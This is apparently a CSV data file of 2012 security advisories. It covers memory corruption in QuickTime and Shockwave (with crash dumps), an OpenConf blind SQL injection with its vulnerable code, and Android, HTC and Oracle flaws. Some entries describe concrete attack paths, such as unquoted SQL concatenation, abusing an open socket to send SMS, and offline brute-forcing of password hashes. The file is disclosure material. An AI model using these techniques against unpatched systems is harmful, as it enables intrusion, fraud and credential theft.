xCFp+ksNHQBlCf7KUDhy0uz5KFzzrPHKoJCVTXBmMz2CErsIJs5rf4ePZhdj2V96
z87qKRojEbeWQGw1lIfXWnytnk1GpPoSb51vhu20J2g4K0IUCor8LTWisVeeVhFu
TlEaNLreQHn+0fVCdYnCWenWzFqJfWvxcUXi3OSysT7+fAacF63ZayuFhGT6WygP
QXdW8fwhwAnFvwcBU4aSVX0tEpbAvQoZGw4EwlU0Osz6DHhJmlH9BYtsvAGX0amh
6Ow/Rg8J1dOicX7W7+bGcgIeNkBalbbiKrMJ2l5SEBhOkFEi0vOJZwDBqceHDDvC
wXYXAIyLqjyd7uyBslnAPqAVoAt3s4ZpAEHKPXSOpWBe4U6idcFNSM2QOj+IEbic
BROlOFXhJnRi69bowISAXdm6bKX/hvFhu9YhbmEfOE2sczp2FfGZ27W80QAboFG+
tfT9a6KmA3pDeh9OPkxABmjhhisPHuP9oSuz0xOiGjcR2A/d7DCtnEQUeLzTV7WI
wtgrlqkJhezNs7JVDcCEm0qXxAUJVTx9KCYvHPFR3IiuKgZba9Keu88wZs9yd/9f
cKSHOSDj2SZ4f4J3lM+llF/z0zjP/hmaQJgKTNsiaO3xl5AzORXMVH25fn4s9UCk
685l8u67flHuv0Iq+m35
=6F6B
-----END PGP SIGNATURE-----"
10354,Apple Quicktime Memory Corruption (CVE-2012-0671),,CVE-2012-0671,"-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA1
Qualys Vulnerability & Malware Research Labs (VMRL)
http://www.qualys.com
http://www.dissect.pe
Memory corruption when Apple Quicktime parsers .pct file
CVE-2012-0671
INTRODUCTION
Apple Quicktime does not properly parse .pct media files, which causes
a corruption in module DllMain by opening a malformed file with an
invalid value located in PoC repro01.pct at offset 0x20E.
This problem was confirmed in the following versions of Quicktime and
Windows, other versions may be also affected.
Quicktime Player version 7.7.1 (1680.42) on Windows XP SP 3 - PT_BR.
Apple addressed the vulnerability in the May's Quicktime Patchset
(http://support.apple.com/kb/HT1222)
CVSS Scoring System
The CVSS score is: 8.6
Base Score: 10
Temporal Score: 8.6
We used the following values to calculate the scores:
Base score is: AV:N/AC:L/Au:N/C:C/I:C/A:C
Temporal score is: E:POC/RL:U/RC:UR

TRIGGERING THE PROBLEM
To trigger the problem a PoC file (repro01.pct) is available to
interested parties.
DETAILS
(f28.c24): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
eax=02a70000 ebx=04402c68 ecx=98b1cc15 edx=00000004 esi=00000000
edi=088a5000
eip=6682ead8 esp=0012bfa8 ebp=00000001 iopl=0 nv up ei pl nz
ac pe nc
cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000
efl=00210216
*** ERROR: Symbol file could not be found. Defaulted to export
symbols for C:Arquivos de programasQuickTimeQTSystemQuickTime.qts -
QuickTime!DllMain+0x2d068:
6682ead8 668907 mov word ptr [edi],ax
ds:0023:088a5000=????
0:000> !exploitable
Exploitability Classification: EXPLOITABLE
Recommended Bug Title: Exploitable - User Mode Write AV starting at
QuickTime!DllMain+0x000000000002d068 (Hash=0x0e483076.0x0e507376)
User mode write access violations that are not near NULL are exploitable.
CREDITS
This vulnerability was discovered by Rodrigo Rubira Branco
(http://twitter.com/bsdaemon) from the Qualys Vulnerability & Malware
Research Labs (VMRL).
-----BEGIN PGP SIGNATURE-----
Version: GnuPG/MacGPG2 v2.0.17 (Darwin)
Comment: GPGTools - http://gpgtools.org
Comment: Using GnuPG with Mozilla - http://enigmail.mozdev.org/
iEYEARECAAYFAk+yvggACgkQRpuC3B/O3qHFUQCfSKJq4wrKYqDLU7fD6wfB3799
rFYAn2bkvPpcY0jsE+tuP2B7E/6rltxX
=sKVJ
-----END PGP SIGNATURE-----"
10389,Adobe Shockwave Player Remote Code Execution (CVE-2012-2031),,CVE-2012-2031,"-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA1
Qualys Vulnerability & Malware Research Labs (VMRL)
http://www.dissect.pe
Memory corruption when Adobe Shockwave Player parses .dir media file
CVE-2012-2031
INTRODUCTION
Adobe Shockwave Player is the Adobe plugin to many different browsers
to view rich-media content on the web including animations,
interactive presentations, and online entertainment.
Adobe Shockwave Player does not properly parse .dir media file, which
causes a corruption in module IMLLib by opening a malformed file with
an invalid value located in PoC repro03.dir at offset 0x3AD1 and 0x3AD5.
This problem was confirmed in the following versions of Adobe
Shockwave Player and MacOS X, other versions may be also affected.
Shockwave Player version 11.6.3r633, Module IMLLib.framework on MacOS
X 10.7.2 (11C74)
CVSS Scoring System
The CVSS score is: 9
Base Score: 10
Temporal Score: 9
We used the following values to calculate the scores:
Base score is: AV:N/AC:L/Au:N/C:C/I:C/A:C
Temporal score is: E:POC/RL:U/RC:C
TRIGGERING THE PROBLEM
To trigger the problem a PoC file (repro03.dir) is available to
interested parties. Use Firefox or Safari to open the file and
reproduce the vulnerability.
DETAILS
Program received signal EXC_BAD_ACCESS, Could not access memory.
Reason: KERN_PROTECTION_FAILURE at address: 0x00000009
0x045081fb in imMemDisposalCallbackControl ()
(gdb) bt
#0 0x045081fb in imMemDisposalCallbackControl ()
#1 0x070f47fd in VListGetNumEntries ()
#2 0x070e9aa7 in MovieMemoryDispose ()
#3 0x070e22d4 in MovieMemoryDispose ()
#4 0x070e2329 in MovieMemoryDispose ()
#5 0x070f0778 in MovieMemoryDispose ()
#6 0x070f0e15 in MovieMemoryDispose ()
#7 0x06ffe64a in TELscriptRef_GetPropertyInitsAsHandle ()
#8 0x06ffe7e8 in TELscriptRef_GetPropertyInitsAsHandle ()
#9 0x06fff579 in TELscriptRef_GetPropertyInitsAsHandle ()
#10 0x0700082d in TELscriptRef_GetPropertyInitsAsHandle ()
#11 0x06ffa691 in TETourGetCpuHogTicks ()
#12 0x06fa1684 in MovieInstAnimIdle ()
#13 0x01f524f4 in main ()
#14 0x01f526fa in main ()
#15 0x04531a64 in imNPMessageHandleMacEvent ()
#16 0x01f507cf in main ()
#17 0x01f535d0 in main ()
#18 0x01f48bcc in dyld_stub_Gestalt ()
#19 0x996bedd9 in CAOpenGLLayerDraw ()
#20 0x996be842 in -[CAOpenGLLayer _display] ()
#21 0x9968dff5 in CA::Layer::display ()
#22 0x9968df11 in -[CALayer display] ()
#23 0x99685aec in CA::Layer::display_if_needed ()
#24 0x99684883 in CA::Context::commit_transaction ()
#25 0x99684594 in CA::Transaction::commit ()
#26 0x99683b29 in CA::Transaction::observer_callback ()
#27 0x96f697be in
__CFRUNLOOP_IS_CALLING_OUT_TO_AN_OBSERVER_CALLBACK_FUNCTION__ ()
#28 0x96f696fd in __CFRunLoopDoObservers ()
#29 0x96f3b917 in CFRunLoopRunSpecific ()
#30 0x96f3b798 in CFRunLoopRunInMode ()
#31 0x95638a7f in RunCurrentEventLoopInMode ()
#32 0x9563fd9b in ReceiveNextEventCommon ()
#33 0x9563fc0a in BlockUntilNextEventMatchingListInMode ()
#34 0x95c8c040 in _DPSNextEvent ()
#35 0x95c8b8ab in -[NSApplication
nextEventMatchingMask:untilDate:inMode:dequeue:] ()
#36 0x95c87c22 in -[NSApplication run] ()
#37 0x01036dd9 in nsXPTCStubBase::Stub249 ()
(gdb) x/i $pc
0x45081fb <imMemDisposalCallbackControl+117>: movzwl 0x8(%edx),%eax
(gdb) i r $edx $eax
edx 0x1 1
eax 0xbfffaa0c -1073763828
CREDITS
This vulnerability was discovered by Rodrigo Rubira Branco
(http://twitter.com/bsdaemon) from the Qualys Vulnerability & Malware
Research Labs (VMRL).
-----BEGIN PGP SIGNATURE-----
Version: GnuPG/MacGPG2 v2.0.17 (Darwin)
Comment: GPGTools - http://gpgtools.org
Comment: Using GnuPG with Mozilla - http://enigmail.mozdev.org/
iEYEARECAAYFAk+qnc8ACgkQRpuC3B/O3qEJswCfduYDmABYcfBoIKXoNDWNEoDO
LY4An2uIfhYjkcTg/zAw5khcFK96IRm4
=SZCB
-----END PGP SIGNATURE-----"
10390,Adobe Shockwave Player Remote Code Execution (CVE-2012-2030),,CVE-2012-2030,"-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA1
Qualys Vulnerability & Malware Research Labs (VMRL)
http://www.dissect.pe
Memory corruption when Adobe Shockwave Player parses .dir media file
CVE-2012-2030
INTRODUCTION
Adobe Shockwave Player is the Adobe plugin to many different browsers
to view rich-media content on the web including animations,
interactive presentations, and online entertainment.
Adobe Shockwave Player does not properly parse .dir media file, which
causes a corruption in module DPLib by opening a malformed file with
an invalid value located in PoC repro02.dir at offset 0x36A4.
This problem was confirmed in the following versions of Adobe
Shockwave Player and MacOS X, other versions may be also affected.
Shockwave Player version 11.6.3r633, Module DPLib.framework on MacOS X
10.7.2 (11C74)
CVSS Scoring System
The CVSS score is: 9
Base Score: 10
Temporal Score: 9
We used the following values to calculate the scores:
Base score is: AV:N/AC:L/Au:N/C:C/I:C/A:C
Temporal score is: E:POC/RL:U/RC:C
TRIGGERING THE PROBLEM
To trigger the problem a PoC file (repro02.dir) is available to
interested parties. Use Firefox or Safari to open the file and
reproduce the vulnerability.
DETAILS
Program received signal EXC_BAD_ACCESS, Could not access memory.
Reason: KERN_PROTECTION_FAILURE at address: 0x90000004
0x0714b9db in MovieMemoryDispose ()
(gdb) bt
#0 0x0714b9db in MovieMemoryDispose ()
#1 0x0714d329 in MovieMemoryDispose ()
#2 0x0715b778 in MovieMemoryDispose ()
#3 0x0715be15 in MovieMemoryDispose ()
#4 0x0706964a in TELscriptRef_GetPropertyInitsAsHandle ()
#5 0x070697e8 in TELscriptRef_GetPropertyInitsAsHandle ()
#6 0x0706a579 in TELscriptRef_GetPropertyInitsAsHandle ()
#7 0x0706b82d in TELscriptRef_GetPropertyInitsAsHandle ()
#8 0x07065691 in TETourGetCpuHogTicks ()
#9 0x0700c684 in MovieInstAnimIdle ()
#10 0x01f524f4 in main ()
#11 0x01f526fa in main ()
#12 0x055e8a64 in imNPMessageHandleMacEvent ()
#13 0x01f507cf in main ()
#14 0x01f535d0 in main ()
#15 0x01f48bcc in dyld_stub_Gestalt ()
#16 0x996bedd9 in CAOpenGLLayerDraw ()
#17 0x996be842 in -[CAOpenGLLayer _display] ()
#18 0x9968dff5 in CA::Layer::display ()
#19 0x9968df11 in -[CALayer display] ()
#20 0x99685aec in CA::Layer::display_if_needed ()
#21 0x99684883 in CA::Context::commit_transaction ()
#22 0x99684594 in CA::Transaction::commit ()
#23 0x99683b29 in CA::Transaction::observer_callback ()
#24 0x96f697be in
__CFRUNLOOP_IS_CALLING_OUT_TO_AN_OBSERVER_CALLBACK_FUNCTION__ ()
#25 0x96f696fd in __CFRunLoopDoObservers ()
#26 0x96f3b917 in CFRunLoopRunSpecific ()
#27 0x96f3b798 in CFRunLoopRunInMode ()
#28 0x95638a7f in RunCurrentEventLoopInMode ()
#29 0x9563fd9b in ReceiveNextEventCommon ()
#30 0x9563fc0a in BlockUntilNextEventMatchingListInMode ()
#31 0x95c8c040 in _DPSNextEvent ()
#32 0x95c8b8ab in -[NSApplication
nextEventMatchingMask:untilDate:inMode:dequeue:] ()
#33 0x95c87c22 in -[NSApplication run] ()
#34 0x01036dd9 in nsXPTCStubBase::Stub249 ()
(gdb) x/i $pc
0x714b9db <MovieMemoryDispose+445486>: incl 0x4(%eax)
(gdb) i r $eax
eax 0x90000000 -1879048192
CREDITS
This vulnerability was discovered by Rodrigo Rubira Branco
(http://twitter.com/bsdaemon) from the Qualys Vulnerability & Malware
Research Labs (VMRL).
-----BEGIN PGP SIGNATURE-----
Version: GnuPG/MacGPG2 v2.0.17 (Darwin)
Comment: GPGTools - http://gpgtools.org
Comment: Using GnuPG with Mozilla - http://enigmail.mozdev.org/
iEYEARECAAYFAk+qncsACgkQRpuC3B/O3qEWNwCfQQcZjDDOTzZTu3W1DrfMs7eN
/NYAnjXnpMpH/hgaAQRGa1huDADRERDI
=UIh/
-----END PGP SIGNATURE-----"
10391,Adobe Shockwave Player Remote Code Execution (CVE-2012-2029),,CVE-2012-2029,"-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA1
Qualys Vulnerability & Malware Research Labs (VMRL)
http://www.dissect.pe
Memory corruption when Adobe Shockwave Player parses .dir media file
CVE-2012-2029
INTRODUCTION
Adobe Shockwave Player is the Adobe plugin to many different browsers
to view rich-media content on the web including animations,
interactive presentations, and online entertainment.
Adobe Shockwave Player does not properly parse .dir media file, which
causes a corruption in module IMLLib by opening a malformed file with
an invalid value located in PoC repro01.dir at offset 0x2306.
This problem was confirmed in the following versions of Adobe
Shockwave Player and MacOS X, other versions may be also affected.
Shockwave Player version 11.6.3r633, Module IMLLib.framework on MacOS
X 10.7.2 (11C74)
CVSS Scoring System
The CVSS score is: 9
Base Score: 10
Temporal Score: 9
We used the following values to calculate the scores:
Base score is: AV:N/AC:L/Au:N/C:C/I:C/A:C
Temporal score is: E:POC/RL:U/RC:C
TRIGGERING THE PROBLEM
To trigger the problem a PoC file (repro01.dir) is available to
interested parties. Use Firefox or Safari to open the file and
reproduce the vulnerability.
DETAILS
Disassembly:
(gdb) disas $pc
Dump of assembler code for function memmove$VARIANT$sse42:
0x991539bd <memmove$VARIANT$sse42+0>: push %ebp
0x991539be <memmove$VARIANT$sse42+1>: mov %esp,%ebp
0x991539c0 <memmove$VARIANT$sse42+3>: push %esi
0x991539c1 <memmove$VARIANT$sse42+4>: push %edi
0x991539c2 <memmove$VARIANT$sse42+5>: mov 0x8(%ebp),%edi
0x991539c5 <memmove$VARIANT$sse42+8>: mov 0xc(%ebp),%esi
0x991539c8 <memmove$VARIANT$sse42+11>: mov 0x10(%ebp),%ecx
0x991539cb <memmove$VARIANT$sse42+14>: mov %edi,%edx
0x991539cd <memmove$VARIANT$sse42+16>: sub %esi,%edx
0x991539cf <memmove$VARIANT$sse42+18>: cmp %ecx,%edx
0x991539d1 <memmove$VARIANT$sse42+20>: jb 0x99153a01
<memmove$VARIANT$sse42+68>
0x991539d3 <memmove$VARIANT$sse42+22>: cmp $0x50,%ecx
0x991539d6 <memmove$VARIANT$sse42+25>: ja 0x99153a06
<memmove$VARIANT$sse42+73>
0x991539d8 <memmove$VARIANT$sse42+27>: mov %ecx,%edx
0x991539da <memmove$VARIANT$sse42+29>: shr $0x2,%ecx
0x991539dd <memmove$VARIANT$sse42+32>: je 0x991539ec
<memmove$VARIANT$sse42+47>
0x991539df <memmove$VARIANT$sse42+34>: mov (%esi),%eax <----- Crash
here
Program received signal EXC_BAD_ACCESS, Could not access memory.
Reason: KERN_INVALID_ADDRESS at address: 0x3f5d8935
0x991539df in memmove$VARIANT$sse42 ()
(gdb) bt
#0 0x991539df in memmove$VARIANT$sse42 ()
#1 0x0452eb61 in imPostQuitMessage ()
#2 0x045079f5 in imMemCopy ()
#3 0x070f414d in VListGetNumEntries ()
#4 0x0700b93a in TELscriptRef_GetPropertyInitsAsHandle ()
#5 0x0709b6b3 in MovieMemoryDispose ()
#6 0x0703d409 in TELscriptRef_GetPropertyInitsAsHandle ()
#7 0x0703db71 in TELscriptRef_GetPropertyInitsAsHandle ()
#8 0x0705e4f5 in mmpRewind ()
#9 0x06fa1970 in MovieInstLoadMovie ()
#10 0x01f51f89 in main ()
#11 0x01f526fa in main ()
#12 0x04531a64 in imNPMessageHandleMacEvent ()
#13 0x01f507cf in main ()
#14 0x01f535d0 in main ()
#15 0x01f48bcc in dyld_stub_Gestalt ()
#16 0x996bedd9 in CAOpenGLLayerDraw ()
#17 0x996be842 in -[CAOpenGLLayer _display] ()
#18 0x9968dff5 in CA::Layer::display ()
#19 0x9968df11 in -[CALayer display] ()
#20 0x99685aec in CA::Layer::display_if_needed ()
#21 0x99684883 in CA::Context::commit_transaction ()
#22 0x99684594 in CA::Transaction::commit ()
#23 0x996843f8 in +[CATransaction commit] ()
#24 0x010838dd in nsCARenderer::Render ()
Previous frame inner to this frame (gdb could not unwind past this frame)
(gdb) x/i $pc
0x991539df <memmove$VARIANT$sse42+34>: mov (%esi),%eax
(gdb) i r $esi $eax
esi 0x3f5d8935 1063094581
eax 0x4 4
CREDITS
This vulnerability was discovered by Rodrigo Rubira Branco
(http://twitter.com/bsdaemon) from the Qualys Vulnerability & Malware
Research Labs (VMRL).
-----BEGIN PGP SIGNATURE-----
Version: GnuPG/MacGPG2 v2.0.17 (Darwin)
Comment: GPGTools - http://gpgtools.org
Comment: Using GnuPG with Mozilla - http://enigmail.mozdev.org/
iEYEARECAAYFAk+qncAACgkQRpuC3B/O3qGHDwCeIT4yhw741QM5TRwH1WSD7bHF
0dYAn2IUJG6ADX9vOF5sreWRXmPO3fTO
=O1Ew
-----END PGP SIGNATURE-----"
10414,Advisory: Android SQLite Journal Information Disclosure (CVE-2011-3901),,CVE-2011-3901,"1 Background
============
Android applications are executed in a sandbox environment, to ensure that no
application can access sensitive information held by another, without adequate
privileges. For example, The Browser application holds sensitive information
such as cookies, cache and history, and this cannot be accessed by third-party
apps, while the Google Talk application stores contacts and conversations. An
android app may request specific privileges during its installation; if granted
by the user, the app's capabilities are extended.
One mechanism which Android uses in order to implement the sandbox, is running
each application as a separate process, and as a Linux user which is private to
the application's package. Running applications as different users makes files
owned by one application inaccessible to another (unless explicitly allowed).
At the application deployment phase, Android allocates the application a data
directory, identified by the application's package, under the /data/data path.
Android provides support for SQLite databases. Applications can create a private
database identified by name. Once created, the database is stored under the
/data/data/<app package>/databases directory, with the chosen name as
a filename.
The SQLite database engine maintains a rollback journal. When an application
changes the database, the original unchanged database is first copied to the
journal, and in case of a crash or a ROLLBACK action, the database can be
recovered. The journal has the same filename as the database itself, but with
a -journal suffix.
2 Vulnerability
===============
The journal file of SQLite databases can be read by all applications:
* The application's data directory has execution rights for all users, up to the
root. This means that files with read or write permissions for all users, found
under the application's data directory are actually globally accessible.
* The /data/data/<app package>/databases directory is created with [rwxrwx--x]
permissions, meaning that files under that dir with global read or write
permissions, are globally readable or writable.
* The journal file is created under the databases directory with [-rw-r--r--]
permissions and therefore it can be read by all apps.
Conclusion: All databases maintained by Android's SQLite engine (unless named
with a random and unguessable string) can be leaked by malicious applications
without the need to declare adequate privileges. The databases can be leaked
during the lifetime of the journal file, (i.e. when the transaction is made).
3 Impact
========
A malicious app can eavesdrop on database activities performed by any other
application using SQLite, allowing unauthorized access to information such as
URL history, messages, and contacts.
4 Vulnerable versions
=====================
Android 2.3.7.
5 Non-vulnerable versions
=========================
Android 4.0.1.
6 Credit
========
Discovered by Roee Hay <roeeh il ibm com>
7 Acknowledgments
=================
We would like to thank the Android Security Team for the efficient way in which
they handled this security issue.
8 References
============
* Full advisory with PoC. http://bit.ly/K0W0pT
* Blog post. http://bit.ly/JEThEf
* Video demonstration. http://youtu.be/oCXLHjmH5rY"
10419,[CVE-2012-1002] OpenConf <= 4.11 (author/edit.php) Blind SQL Injection Vulnerability,,CVE-2012-1002,"--------------------------------------------------------------------
OpenConf <= 4.11 (author/edit.php) Blind SQL Injection Vulnerability
--------------------------------------------------------------------
author...............: Egidio Romano aka EgiX
mail.................: n0b0d13s[at]gmail[dot]com
software link........: http://www.openconf.com/
affected versions....: from 4.00 to 4.11
[-] Vulnerable code in /author/edit.php:
104. // get sub
105. $anr = ocsql_query(""SELECT * FROM `"" . OCC_TABLE_PAPER . ""` WHERE `paperid`="" . safeSQLstr($_POST['pid'])) ...
106. if (mysql_num_rows($anr) != 1) {
107. err(oc_('Submission ID or password entered is incorrect'));
108. }
109. $_POST = array_merge($_POST, mysql_fetch_assoc($anr));
User input passed through $_POST['pid'] seems correctly sanitised by the safeSQLstr() function, but in the query
at line 105 single quotes aren't used before concatenate the user input into the query string. This can be
exploited to conduct a Blind SQL Injection attack. Successful exploitation of this vulnerability requires at
least a record into the 'paper' table, and 'Edit Submission' to be enabled.
[-] Disclosure timeline:
[27/01/2012] - Vulnerability discovered
[01/02/2012] - Issue reported to bugs(at)openconf.com
[02/02/2012] - Version 4.12 released: http://www.openconf.com/news/#20120202
[02/02/2012] - CVE number requested
[02/02/2012] - Assigned CVE-2012-1002
[02/05/2012] - Public disclosure
[-] Proof of concept:
http://www.exploit-db.com/exploits/18820/"
10482,HTC IQRD Android Permission Leakage (CVE-2012-2217),,CVE-2012-2217,"VSR Security Advisory
http://www.vsecurity.com/
-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
Advisory Name: HTC IQRD Android Permission Leakage
Release Date: 2012-04-20
Application: IQRD on HTC Android Phones
Author: Dan Rosenberg <drosenberg (at) vsecurity.com>
Vendor Status: Patch Released
CVE Candidate: CVE-2012-2217
Reference: http://www.vsecurity.com/resources/advisory/20120420-1/
-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
Product Description
-------------------
The IQRD service is HTC's implementation of a Carrier IQ porting layer on
several HTC Android phones. Carrier IQ is a data collection framework that may
be deeply integrated into the Android application stack in order to provide
cell carriers with detailed metrics data on device and network activity [1].
To complete the integration of Carrier IQ on a specific device, phone
manufacturers provide a ""porting layer"" that allows the Carrier IQ service to
perform specific actions that may vary by device.
Vulnerability Details
---------------------
On December 22th, VSR identified a vulnerability in IQRD. The IQRD service
listens locally on a TCP socket bound to port 2479. This socket is intended to
allow the Carrier IQ service to request device-specific functionality from
IQRD. Unfortunately, there is no restriction or validation on which
applications may request services using this socket. As a result, any
application with the android.permission.INTERNET permission may connect to this
socket and send specially crafted messages in order to perform potentially
malicious actions.
In particular, it is possible for malicious applications to:
1. Trigger UI popup messages
2. Generate tones
3. Send arbitrary outbound SMS messages that do not appear in a user's
outbox, facilitating toll fraud
4. Retrieve a user's Network Access Identifier (NAI) and corresponding
password, potentially allowing rogue devices to impersonate the user
on a CDMA network
Versions Affected
-----------------
The issue is confirmed to affect the HTC EVO 4G, HTC EVO Design 4G, EVO Shift
4G, HTC EVO 3D, HTC EVO View 4G, and HTC Hero on Sprint; and the HTC Vivid on
AT&T.
Vendor Response
---------------
The following timeline details HTC's response to the reported issue:
2011-12-22 Vulnerability reported to HTC
2011-12-28 HTC confirms receipt, replies that fix is planned for early 2012
2012-03-10 VSR requests status update
2012-03-16 HTC confirms fix has been published
2012-03-26 HTC requests clarification on finding
2012-03-26 VSR provides clarification on finding, requests confirmation on
status of fix
2012-04-02 HTC provides confirmation of fix, requests further clarification
2012-04-02 VSR provides clarification on finding
2012-04-12 VSR provides draft advisory to HTC
2012-04-13 HTC provides corrections to advisory, requests disclosure date
2012-04-20 Coordinated disclosure
Recommendation
--------------
HTC has issued a fix that will typically be provided as an OTA update by
affected cell carriers. If the update has not automatically been installed, it
is possible to retrieve the update manually by navigating to Menu -> Settings
-> System Updates -> HTC Software Update -> Check Now.
The following software versions on Sprint are confirmed to resolve this issue:
HTC EVO 4G: 4.67.651.3
HTC EVO Design 4G: 2.12.651.5
HTC EVO Shift 4G: 2.77.651.3
HTC EVO 3D: 2.17.651.5
HTC EVO View 4G: 2.23.651.1
The following software versions on AT&T are confirmed to resolve this issue:
HTC Vivid: 3.26.502.56
All affected devices except the HTC Hero have received an over-the-air update.
HTC and Sprint have declined to update the HTC Hero, citing its 2009 release,
minimal current usage, and lack of malicious applications in the Android
Marketplace exploiting this vulnerability.
Users should be aware that devices that no longer receive updates due to
switching carriers may remain vulnerable.
Common Vulnerabilities and Exposures (CVE) Information
------------------------------------------------------
The Common Vulnerabilities and Exposures (CVE) project has assigned the number
CVE-2012-2217 to this issue. This is a candidate for inclusion in the CVE list
(http://cve.mitre.org), which standardizes names for security problems.
Acknowledgements
----------------
Thanks to HTC for their response and fix.
-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
References:
1. Carrier IQ
http://www.carrieriq.com
-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
This advisory is distributed for educational purposes only with the sincere
hope that it will help promote public safety. This advisory comes with
absolutely NO WARRANTY; not even the implied warranty of merchantability or
fitness for a particular purpose. Neither Virtual Security Research, LLC nor
the author accepts any liability for any direct, indirect, or consequential
loss or damage arising from use of, or reliance on, this information.
See the VSR disclosure policy for more information on our responsible disclosure
practices:
http://www.vsecurity.com/company/disclosure
-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
Copyright 2012 Virtual Security Research, LLC. All rights reserved."
10494,OCIPasswordChange API leaks information of password hash (CVE-2012-0511),,CVE-2012-0511,"-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA1
AppSecInc Team SHATTER Security Advisory
OCIPasswordChange API leaks information of password hash.
Risk Level:
High
Affected versions:
Oracle Database Server version 10gR1, 10gR2 (10.2.0.4 and previous
patchsets) and 11gR1 (11.1.0.7 and previous patchsets)
Remote exploitable:
Yes (No authentication is required)
Credits:
This vulnerability was discovered and researched by Esteban Martinez
Fayo of Application Security Inc.
Details:
Oracle Database provides OCIPasswordChange API to change user passwords.
This API can be used while a user is logged on as well as before the
authentication process is completed, this is because it can be used for
accounts that have the password expired so that the user is able to
change an expired password for a new one.
It was observed that for locked accounts this API leaks information
about the correct user password hash by giving different responses,
depending on whether the decryption of the new password
(AUTH_NEW_PASSWORD field), performed by the server, is successful or
not. This information can be used to perform an off-line brute force
attack to guess the correct password. Internal proof-of-concept tool
demonstrated that it is possible to try millions of passwords per
second, making it possible to crack passwords that are less than 9
characters length in a few hours.
Note that to perform this attack the account must be locked. An
attacker can lock an account by reaching the maximum failed login
attempts limit (by default 10). The attacker will be able to log in as
the user once the account is unlocked.
Impact:
Remote unauthenticated attackers can perform off-line unlimited password
guesses on locked database accounts.
Vendor Status:
Vendor was contacted and a patch was released.
Workaround:
Implement a strong password policy.
Use some kind of external authentication (like network or directory
service based) instead of native database authentication.
Fix:
Apply Oracle Critical Patch Update April 2012 available at Oracle Support.
CVE:
CVE-2012-0511
Links:
http://www.oracle.com/technetwork/topics/security/cpuapr2012-366314.html
https://www.teamshatter.com/?p=3434
Timeline:
Vendor Notification - 12/08/2011
Vendor Response - 12/15/2011
Fix - 4/17/2012
Public Disclosure - 4/19/2012
- --
_____________________________________________
Copyright (c) 2012 Application Security, Inc.
http://www.appsecinc.com
About Application Security, Inc.
AppSecInc is a pioneer and leading provider of database security
solutions for the enterprise.
By providing strategic and scalable software-only solutions -
AppDetectivePro for auditors and IT advisors, and DbProtect for the
enterprise - AppSecInc supports the database security lifecycle for some
of the most complex and demanding environments in the world across more
than 1,300 active commercial and government customers.
Leveraging the world's most comprehensive database security
knowledgebase from the company's renowned team of threat researchers,
TeamSHATTER, AppSecInc products help customers achieve unprecedented
levels of data security from nefarious or accidental activities, while
reducing overall risk and helping to ensure continuous regulatory and
industry compliance.
Disclaimer: The information in the advisory is believed to be accurate
at the time of publishing based on currently available information. Use
of the information constitutes acceptance for use in an AS IS condition.
There are no warranties with regard to this information. Neither the
author nor the publisher accepts any liability for any direct, indirect,
or consequential loss or damage arising from use of, or reliance on,
this information.
-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1.4.11 (MingW32) - WinPT 1.4.3
Charset: UTF-8
iEYEARECAAYFAk+QeeMACgkQRx91imnNIgEmCQCcCLZ1sAbpmovyaaa5xJ+Zi41u
KkYAn1jcGgpMrvGuDE/7dvSIi5bOzQcO
=P0et
-----END PGP SIGNATURE-----"
10495,Oracle Enterprise Manager vulnerable to Session fixation (CVE-2012-0528),,CVE-2012-0528,"-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA1
AppSecInc Team SHATTER Security Advisory
Oracle Enterprise Manager vulnerable to Session fixation.
Risk Level:
Low
Affected versions:
Oracle Enterprise Manager Database Control 10.2.0.5, 11.1.0.7 (and
previous patchsets)
Remote exploitable:
Yes
Credits:
This vulnerability was discovered and researched by Esteban Martinez
Fayo of Application Security Inc.
Details:
Authenticating a web user without invalidating any existing session
identifier gives an attacker the opportunity to steal authenticated
sessions.
Oracle Enterprise Manager authenticates a user without first
invalidating the existing session ID, thereby continuing to use the same
session ID already associated with the session. This can be exploited
in shared computer environments if the attacker navigates to the login
web page /em/console/logon/logon and records the session ID associated,
then closes the browser. When a legitimate user logs on, the same
Session ID will be used so the attacker will be able to take over the
session and perform operations on the victim's behalf.
Impact:
An attacker who has access to a computer with a web browser that will
later be used in an Oracle Enterprise Manager web session, can know
which session ID will be used, therefore will be able to impersonate the
legitimate user.
Vendor Status:
Vendor was contacted and a patch was released.
Workaround:
There is no workaround for this vulnerability.
Fix:
Apply Oracle Critical Patch Update April 2012 available at Oracle Support.
CVE:
CVE-2012-0528
Links:
http://www.oracle.com/technetwork/topics/security/cpuapr2012-366314.html
https://www.teamshatter.com/?p=3429
Timeline:
Vendor Notification - 08/16/2011
Vendor Response - 08/18/2011
Fix - 4/17/2012
Public Disclosure - 4/19/2012
- --
_____________________________________________
Copyright (c) 2012 Application Security, Inc.
http://www.appsecinc.com
About Application Security, Inc.
AppSecInc is a pioneer and leading provider of database security
solutions for the enterprise.
By providing strategic and scalable software-only solutions -
AppDetectivePro for auditors and IT advisors, and DbProtect for the
enterprise - AppSecInc supports the database security lifecycle for some
of the most complex and demanding environments in the world across more
than 1,300 active commercial and government customers.
Leveraging the world's most comprehensive database security
knowledgebase from the company's renowned team of threat researchers,
TeamSHATTER, AppSecInc products help customers achieve unprecedented
levels of data security from nefarious or accidental activities, while
reducing overall risk and helping to ensure continuous regulatory and
industry compliance.
Disclaimer: The information in the advisory is believed to be accurate
at the time of publishing based on currently available information. Use
of the information constitutes acceptance for use in an AS IS condition.
